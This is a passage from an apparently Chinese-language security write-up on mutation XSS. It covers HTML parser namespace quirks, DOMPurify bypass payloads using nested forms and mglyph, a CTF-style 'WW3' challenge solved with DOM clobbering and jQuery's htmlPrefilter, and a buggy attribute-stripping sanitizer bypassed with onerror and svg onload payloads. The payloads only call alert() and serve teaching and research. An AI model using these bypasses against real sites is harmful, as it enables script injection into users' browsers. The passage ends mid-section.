<li>当你打开一个 <code>&lt;form&gt;</code>  标签时，解析器需要使用<strong>表单元素指针</strong>打开的（在规范中是这样调用的）。如果指针不是 <code>null</code> ，则 <code>form</code>  无法创建元素。</li>
<li>结束 <code>&lt;form&gt;</code>  标记时，表单元素指针始终设置为 <code>null</code> 。</li>
</ul>
<p>注意：一般来说子元素是要紧贴父元素的</p>
<p>现在，如果我们尝试序列化生成的 DOM 树，我们将得到以下标记：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;&lt;/form&gt;&lt;/div&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-7-1536x151.png" alt=""></p>
<p>所以这证明了序列化后再次解析不能保证返回原始 DOM 树，同时再次解析后内层 form 消失了</p>
<p>3. 外部内容</p>
<p>HTML 解析器可以创建一个包含三个命名空间元素的 DOM 树：</p>
<ul>
<li>HTML 命名空间</li>
<li>SVG 命名空间</li>
<li>MathML 命名空间 ，是 XML 语言的子集 zhangxinxu</li>
</ul>
<p>默认情况下，所有元素都在 HTML 命名空间中；但是，如果解析器遇到 <code>&lt;svg&gt;</code> or <code>&lt;math&gt;</code>  元素，则它分别 “切换” 到 SVG 和 MathML 命名空间。并且这两个命名空间都会产生外部内容。</p>
<p>在外部内容中，标记的解析方式与普通 HTML 不同。这可以在解析 <code>&lt;style&gt;</code>  元素时清楚地显示出来。在 HTML 命名空间中， <code>&lt;style&gt;</code>  只能包含文本；没有后代，并且不解码 HTML 实体。外部内容并非如此：外部内容 <code>&lt;style&gt;</code>  可以有子元素，并且实体被解码。</p>
<p><code>&lt;style&gt;&lt;a&gt;ABC&lt;/style&gt;&lt;svg&gt;&lt;style&gt;&lt;a&gt;ABC</code></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8-1536x308.png" alt=""></p>
<p>证明了 svg 命名空间中的 style 可以被解析</p>
<p>如果我们在里面 <code>&lt;svg&gt;</code> ， <code>&lt;math&gt;</code>  那么所有元素也都在非 HTML 命名空间中。但是这是错误的。HTML 规范中有一些元素称为<strong> MathML 文本集成点</strong>和<strong> HTML 集成点</strong>。这些元素的子元素具有 HTML 命名空间</p>
<p><code>&lt;math&gt;&lt;style&gt;&lt;a&gt;A&lt;/style&gt;&lt;mtext&gt;&lt;style&gt;&lt;a&gt;B&lt;/style&gt;</code></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9-1536x207.png" alt=""></p>
<p>请注意 <code>style</code>  作为 math 的直接子元素 <code>在 MathML 命名空间中，而</code> 第二个 style <code>在mtext下则是 HTML 命名空间中。这是因为</code>  mtext` 是<strong> MathML 文本集成点</strong>并使解析器切换命名空间。</p>
<p>MathML 文本集成点是：</p>
<ul>
<li><code>math mi</code></li>
<li><code>math mo</code></li>
<li><code>math mn</code></li>
<li><code>math ms</code></li>
</ul>
<p>HTML 集成点是：</p>
<ul>
<li><code>math annotation-xml</code>  如果它有一个名为的属性， <code>encoding</code>  其值等于 <code>text/html</code>  或  <code>application/xhtml+xml</code></li>
<li><code>svg foreignObject</code></li>
<li><code>svg desc</code></li>
<li><code>svg title</code></li>
</ul>
<p>但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的</p>
<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了<mglyph><malignmark>。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png" alt=""></p>
<p>最终 payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>使用以上所有内容，我们可以创建一个包含两个 <code>form</code>  元素和 <code>mglyph</code>  元素的标记，该标记最初位于 HTML 命名空间中，但在重新解析它时位于 MathML 命名空间中，从而使后续 <code>style</code>  标记的解析方式不同并导致 XSS。</p>
<p>payload 利用错误嵌套的 <code>html form</code>  元素，并且还包含 <code>mglyph</code>  元素。它生成以下 DOM 树：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-11-1536x326.png" alt=""></p>
<p>这个 DOM 树是无害的。所有元素都在 DOMPurify 的允许列表中。请注意，这 <code>mglyph</code>  是在 HTML 命名空间中。看起来像 XSS playload 的片段只是 <code>html style</code> . 因为有一个嵌套的 <code>html form</code> ，我们可以非常确定这个 DOM 树将在重新解析时发生变异。</p>
<p>序列化之后的 html 是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/form&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>此代码段具有嵌套 <code>form</code>  标签。所以当它被赋值给 时 <code>innerHTML</code> ，它会被解析成下面的 DOM 树：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-12-1536x312.png" alt=""></p>
<p>所以现在第二个 <code>html form</code>  没有被创建， <code>mglyph</code>  现在是 mtext 的直接子元素，在 MathML 命名空间中。因此， <code>style</code>  它也在 MathML 命名空间中，因此其内容不被视为文本。然后 <code>&lt;/math&gt;</code>  关闭 <code>&lt;math&gt;</code>  元素，现在 <code>img</code>  在 HTML 命名空间中创建，导致 XSS。</p>
<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;&lt;table id=&quot;&lt;/table&gt;&quot;&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104652050.png" alt="image-20221009104652050"></p>
<p>经过二次解析后为</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104805809.png" alt="image-20221009104805809"></p>
<h2 id="ww3"><a class="markdownIt-Anchor" href="#ww3">#</a> WW3</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4NzU4NTQ4MzQtY2RiMDQyYjAtMTUwYS00ZmIzLWIyM2UtMmFlMmI5Zjk5ZTU1Lm1k">📎World War 3.md</span></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Meme Code<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;meme-code&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;notify&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    /* Utils */</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const escape = (dirty) =&gt; unescape(dirty).replace(/[<span class="tag">&lt;&gt;</span>&#x27;&quot;=]/g, &#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const memeTemplate = (img, text) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        return (`<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@import</span> url(<span class="string">&#x27;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#x27;</span>);`+</span></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="language-handlebars">            `<span class="selector-class">.meme-card</span>&#123;<span class="attribute">margin</span>:<span class="number">0</span> auto;<span class="attribute">width</span>:<span class="number">300px</span>&#125;<span class="selector-class">.meme-card</span>&gt;<span class="selector-tag">img</span>&#123;<span class="attribute">width</span>:<span class="number">300px</span>&#125;`+</span></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="language-handlebars">            `<span class="selector-class">.meme-card</span>&gt;<span class="selector-tag">h1</span>&#123;<span class="attribute">text-align</span>:center;<span class="attribute">color</span>:<span class="number">#fff</span>;<span class="attribute">background</span>:black;<span class="attribute">margin-top</span>:-<span class="number">5px</span>;`+</span></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="language-handlebars">            `<span class="attribute">position</span>:relative;<span class="attribute">font-family</span>:Oswald,sans-serif;<span class="attribute">font-weight</span>:<span class="number">700</span>&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>`+</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            `<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;meme-card&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;$&#123;img&#125;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>$&#123;text&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>`)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const memeGen = (that, notify) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        if (text &amp;&amp; img) &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            template = memeTemplate(img, text)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            if (notify) &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                html = (`<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-warning&quot;</span> <span class="attr">role</span>=<span class="string">&quot;alert&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Meme<span class="tag">&lt;/<span class="name">b</span>&gt;</span> created from $&#123;DOMPurify.sanitize(text)&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>`)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            setTimeout(_ =&gt; &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                $(&#x27;#status&#x27;).remove()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                $(&#x27;#meme-code&#x27;).text(template)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;, 1000)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* Main */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> notify = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> text = <span class="keyword">new</span> <span class="title function_">URL</span>(location).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;text&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title function_">URL</span>(location).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;img&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(</span></span><br><span class="line"><span class="language-javascript">            <span class="string">`&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;status&quot;&gt;`</span>+</span></span><br><span class="line"><span class="language-javascript">            <span class="string">`&lt;img class=&quot;circle&quot; src=&quot;<span class="subst">$&#123;<span class="built_in">escape</span>(img)&#125;</span>&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`</span>+</span></span><br><span class="line"><span class="language-javascript">            <span class="string">`Creating meme... (<span class="subst">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class="line"><span class="language-javascript">        )</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&#x27;#meme-code&#x27;</span>).<span class="title function_">text</span>(<span class="title function_">memeTemplate</span>(<span class="string">&#x27;https://i.imgur.com/PdbDexI.jpg&#x27;</span>, <span class="string">&#x27;When you get that WW3 draft letter&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//代码分析，Utils中为函数声明，main中调用了Utils中的函数</span><br><span class="line">//img和text都被escape或者DOMPurify过滤，无法利用这两个参数</span><br><span class="line">//只要text和img为真，会调用memeGen,memeGen会调用memeTemplate，memeTemplate将img和text写入Meme code中</span><br><span class="line">//memeGen只有SetTimeout中notify存在利用点</span><br><span class="line">//当img和text都为真时，会调用memeTemplate，在meme-code中写入该内容</span><br><span class="line">//memeTemplate存在可控变量img和text，但img在src中，并且存在escape函数，无法闭合，只能利用text</span><br><span class="line">//text需要传入两个值：第一个是为了执行jQuery解析而覆盖的notify，第二个是利用了第一个解析产生弹窗的代码</span><br><span class="line">//通过<span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">notify</span>&gt;</span>覆盖notify,通过<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1337</span>)<span class="comment">//</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>配合jQuery解析绕过domporify</span><br><span class="line">//进入dompuriy过滤的是<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1337</span>)<span class="comment">//</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>,此代码被认为合法，但过滤之后又会被jQuery解析，变为：</span><br><span class="line">//<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1337</span>)<span class="comment">//  ,style被闭合，script标签逃逸,完成弹窗   </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//第一个img必须是合法的图片才能保证img和text同时为真</span><br></pre></td></tr></table></figure>
<p>前置知识 1 jquery script 标签逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(_ =&gt; &#123;</span><br><span class="line">    $(&#x27;#status&#x27;).remove()</span><br><span class="line">    notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span><br><span class="line">    $(&#x27;#meme-code&#x27;).text(template)</span><br><span class="line">&#125;, 1000)</span><br></pre></td></tr></table></figure>
<p>两种解析 html 的方式:<strong>jquery.html&amp;innerhtml</strong>。 <code>innerHTML</code>  是原生 js 的写法， <code>Jqury.html()</code>  也是调用原生的 innerHTML 方法，但是加了自己的解析规则</p>
<p>对于 innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时， <code>&lt;style&gt;</code>  标签中不允许存在子标签 (style 标签最初的设计理念就不能用来放子标签)，如果存在会被当作 text 解析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    &lt;style/&gt;&lt;script&gt;alert(1337)//</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>对于 <code>Jqury.html()</code> ，最终对标签的处理是在 <code>htmlPrefilter()</code>  中实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^/&gt;x20trnf]*)[^&gt;]*)/&gt;/gi</span><br><span class="line">jQuery.extend( &#123;</span><br><span class="line">    htmlPrefilter: function( html ) &#123;</span><br><span class="line">        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</span><br><span class="line"></span><br><span class="line">此处正则匹配完的结果$1和$2均为style</span><br></pre></td></tr></table></figure>
<p>这个正则表达式在匹配 <code>&lt;*/&gt;</code>  之后会重新生成一对标签 (区别于直接调用 innerHTML)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;alert(1337)//</span><br></pre></td></tr></table></figure>
<p>前置知识 2</p>
<p>首先尝试用 DOM-clobbering 创造一个 id 为 <code>notify</code>  的变量，尝试覆盖 notify 使其变为真，走到为真的条件中，但是这种方式不允许覆盖已经存在的变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;img id=notify&gt;</span><br><span class="line">&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">const memeGen = (notify) =&gt;&#123;</span><br><span class="line">    consol.log(notify);  //false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let notify = false;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>但我们可以通过 name 的局部作用域覆盖 notify</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img name=notify&gt;</span><br><span class="line">此时notify为真</span><br></pre></td></tr></table></figure>
<p>前置知识 3：</p>
<p>JS 局部作用域和全局作用域</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig</span><br><span class="line">&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#x27;dog&#x27;;console.log(nickname)&quot;&gt; //dog</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.document.nickname = &#x27;pig&#x27;;</span><br><span class="line">window.nickname = &#x27;cat&#x27;;</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>
<p>在 document.write 中 notify 为 false，但通过 img 的局部作用域覆盖了 notify</p>
<p>在 memeTemplate 中有如下语句：</p>
<p><code>&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;$&#123;img&#125;&quot;&gt;&lt;h1&gt;$&#123;text&#125;&lt;/h1&gt;&lt;/div&gt;</code> )</p>
<p>我们可以将局部作用域的 img 放入 text 中同时利用 jQuery 的解析绕过 dompurify 的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=https://i.imgur.com/PdbDexI.jpg&amp;text=&lt;img%20name=notify&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()//</span><br></pre></td></tr></table></figure>
<p>执行之后写入 memecode，div 中 script 标签被解析，完成弹窗</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012162102961.png" alt="image-20221012162102961"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;notify&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;</span><br><span class="line">		&lt;b&gt;Meme&lt;/b&gt; </span><br><span class="line">		created from </span><br><span class="line">		&lt;img name=&quot;notify&quot;&gt;</span><br><span class="line">		&lt;style&gt;&lt;style&gt;&lt;/style&gt;</span><br><span class="line">		&lt;script&gt;alert()//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h2 id="svg深入研究"><a class="markdownIt-Anchor" href="#svg深入研究">#</a> &lt;svg&gt; 深入研究</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">data</span> = <span class="title function_ invoke__">decodeURIComponent</span>(location.hash.<span class="title function_ invoke__">substr</span>(<span class="number">1</span>));</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">root</span> = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">root.innerHTML = data;</span><br><span class="line"><span class="keyword">for</span> (let el of root.<span class="title function_ invoke__">querySelectorAll</span>(<span class="string">&#x27;*&#x27;</span>)) &#123;</span><br><span class="line">     <span class="keyword">for</span> (let attr of el.attributes) &#123;</span><br><span class="line">         el.<span class="title function_ invoke__">removeAttribute</span>(name)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">document.body.<span class="title function_ invoke__">appendChild</span>(root)</span><br></pre></td></tr></table></figure>
<p>HTML5 中 innerHtml 不执行插入的<script>标签</p>
<p><strong>移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素</strong></p>
<p>exp:  <code>&lt;img a src='a' b onerror=alert(1)&gt;</code></p>
<p>因此我们一般不在同一个数组边循环边删除</p>
<p>修复：先追加到数组中，在移除，即不要在源数组上操作</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (let el of root.<span class="title function_ invoke__">querySelectorAll</span>(<span class="string">&#x27;*&#x27;</span>)) &#123;</span><br><span class="line">     let attrs = []</span><br><span class="line">     <span class="keyword">for</span> (let attr of el.attributes) &#123;</span><br><span class="line">         attrs.<span class="title function_ invoke__">push</span>(attr.name)</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span> (let name of attrs) &#123;</span><br><span class="line">         el.<span class="title function_ invoke__">removeAttribute</span>(name)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">document.body.<span class="title function_ invoke__">appendChild</span>(root); </span><br></pre></td></tr></table></figure>
<p>使用以上修复后</p>
<p>1. 别进循环</p>
<p>2. 进循环别删有用数据</p>
<p>method 1.(利用 html 页面渲染的竞争时间)</p>
<p><code>&lt;svg&gt;&lt;svg onload=alert(1)&gt;</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM2MDcyNzk4NTEtY2UyNDFlNTItZDM4ZS00NWRjLTllZGMtODkxMTM2YTQ5OGI4Lm1k">📎svg 的深度利用来绕过 waf.md</span></p>
<p>1.1  <code>&lt;img src='1' onerror=&quot;alert(1)&quot;&gt;</code>  失败原因</p>
<p>那么很明显， <code>alert(1)</code>  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： <strong>在 DOM 树构建完成以后，就会触发</strong> <code>DOMContentLoaded</code>  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 <code>load</code> <strong> 事件</strong>。</p>
<p>页面的 JS 执行是会阻塞 DOM 树构建的。<strong>所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发</strong> <code>error</code> <strong> 事件</strong>。</p>
<p>由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。</p>
<p>1.2<svg><svg onload=alert(1)> 可以弹窗原因</p>
